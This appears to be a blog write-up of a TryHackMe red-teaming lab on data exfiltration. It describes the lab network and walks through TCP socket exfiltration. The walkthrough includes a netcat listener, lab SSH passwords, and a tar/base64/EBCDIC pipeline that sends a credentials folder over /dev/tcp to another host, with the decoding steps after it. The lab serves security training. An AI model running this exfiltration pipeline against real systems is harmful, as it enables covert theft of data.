---
title: Data Exfiltration
date: 2023-10-20
categories: [THM, Red Teaming]
tags: [data-exfiltration, red-teaming]
img_path: /assets/red-teaming/
mermaid: true
---
> This is content from THM's [Data Exfiltration](https://tryhackme.com/room/dataxexfilt) room, part of the **Red Teaming** learning path.

# What is Data Exfiltration?

**Data Exfiltration (DE)** is a technique used to transfer data from the target's machine to the attacker's machine. The goal is to **mimic normal network activities** in order to hide the transfer and bypass security measures.

This process is part of the last step on the [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html): *Action on Objectives*.

![Cyber Kill Chain](https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/photo/cyber/THE-CYBER-KILL-CHAIN-body.png.pc-adaptive.1280.medium.png){: width="50%"}

# Network Infrastructure

This room has the following network infrastructure available:

![Network Infrastructure](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/224e0380ac936c602fe41c6537ed4565.png)

It consists of two separate networks with multiple clients as well as a Jumpbox machine with access to both networks. There is also a domain name, `thm.com`, which can be used for easier communication within the network. Below is the network information:

|  **Domain Name** | **IP Address** | **Network Access** |
|:----------------:|:--------------:|:------------------:|
| jump.thm.com     | 192.168.0.133  | Net 1 and Net 2    |
| uploader.thm.com | 172.20.0.100   | Net 1              |
| flag.thm.com     | ***.**.*.***   | Net 1              |
| victim2.thm.com  | 172.20.0.101   | Net 1              |
| web.thm.com      | 192.168.0.100  | Net 2              |
| icmp.thm.com     | 192.168.0.121  | Net 2              |
| victim1.thm.com  | 192.168.0.101  | Net 2              |

It is recommended to connect via SSH to the Jumpbox machine, and perform the rooms exercises from there. The room also suggests using `tmux` to manage the SSH connections needed. 

Another way is to first connect to Jumpbox via SSH, then open a new terminal tab, connect to Jumpbox again, and from there connect to the required machine, e.g. `victim1`.

# TCP Socket Exfiltration

This method is **easy to detect** as it relies on non-standard protocols, so it is only used when the attacker knows that they are no network-based security products. 

1. Let's start by sending some data over TCP. Open a listener on the Jumpbox machine, and store any received data on `/tmp/` as `task4-creds.data`:

    ```shell
    # connect to Jumpbox via SSH
    ssh thm@10.10.82.111
    # password: tryhackme

    # open a netcat listener on port 8080
    nc -lvp 8080 > /tmp/task4-creds.data
    ```

2. Connect to the target that has the data we want to transmit, `victim1`:

    ```shell
    # on a new terminal tab connect to Jumpbox again
    ssh thm@10.10.82.111
    # password: tryhackme

    # connect via Jumpbox to victim1 via the domain
    ssh thm@victim1.thm.com
    # or via its ip and port
    ssh thm@10.10.82.98 -p 2022
    # password: tryhackme

    # the data need to be transmitted
    cat task4/creds.txt
    ```

    ![Connect to victim1 from Jumpbox](ssh-from-jb-to-victim1.png)

3. Now, we will use the **TCP Socket exfiltration** method. We will also use **data encoding**, a reversible form of data representation, and **archiving** so it is hard for someone to examine them during the trasmission, as it will be in a non-human readable format.

    ```shell
    tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
    ```
    
    Let's break down this command step by step:

    1. `tar zcf - task4/` This command creates a *compressed tarball* (archive) of the `task4` directory and sends the output to the standard output (indicated by `-`) using the `tar` utility. Here's what each option does:
        - `z` Compress the archive using gzip.
        - `c` Create a new archive.
        - `f` Specify the archive file.
        - `-` Send the output to stdout (standard output) instead of a file.
        - `task4/` The directory to be archived.

    2. `|` This is a *pipe operator*, which takes the output of the previous command and passes it as input to the next command.
 
    3. `base64` This command encodes the tarball using *Base64 encoding*. Base64 is a method of encoding binary data into a text-based format.

    4. `|` Another pipe operator.

    5. `dd conv=ebcdic` This command is using the `dd` utility to perform low-level data copying and conversion. The `conv=ebcdic` option is used to convert the data from *ASCII* to *EBCDIC* encoding. *EBCDIC* is another character encoding standard, mostly used on older IBM systems.

    6. `> /dev/tcp/192.168.0.133/8080` This part of the command redirects the output to the IP address 192.168.0.133 on port 8080 using a TCP socket.

    Once we pass the above command, a connection will be received from `victim1` along with the required data in the `/tmp/` directory.

    ![Connection and data received](conn-received.png)

4. We now need to decode and unarchive the data.

    ```shell
    # move the /tmp/ directory
    cd /tmp/

    # decode the data
    dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar

    # unarchive the data
    tar xf task4-creds.tar
    ```
    
    Let's break down the commands again.

    1. `dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar` does the opposite of what we did before.
        - `dd conv=ascii if=task4-creds.data` This part of the command uses the `dd` utility to read data from the input file `task4-creds.data`. Here's what each option does:
            - `conv=ascii` This option specifies that the data should be converted from *EBCDIC* encoding to *ASCII*.
            - `if=task4-creds.data` This option specifies the input file as `task4-creds.data`.

        - `|` This is a pipe operator, which we explained before.

        - `base64 -d` This part of the command uses the `base64` utility to decode the input data. The `-d` option indicates that it's meant for decoding.

        - `> task4-creds.tar` This portion of the command redirects the decoded data to an output file named `task4-creds.tar`. The data, which was originally encoded and then decoded, is saved in this file.

    2. `tar` This is the command-line utility for working with tar archives. "tar" stands for "tape archive," and it's commonly used to create, extract, and manipulate archives of files and directories.
        - `x` This option stands for "extract." It is used to extract the contents of an archive.
        - `f` This option specifies that the next argument will be the name of the archive file from which you want to extract the contents. In this case, `task4-creds.tar` is the archive file.


    ![Decoding and unarchiving data](decode-unarchive-data.png)
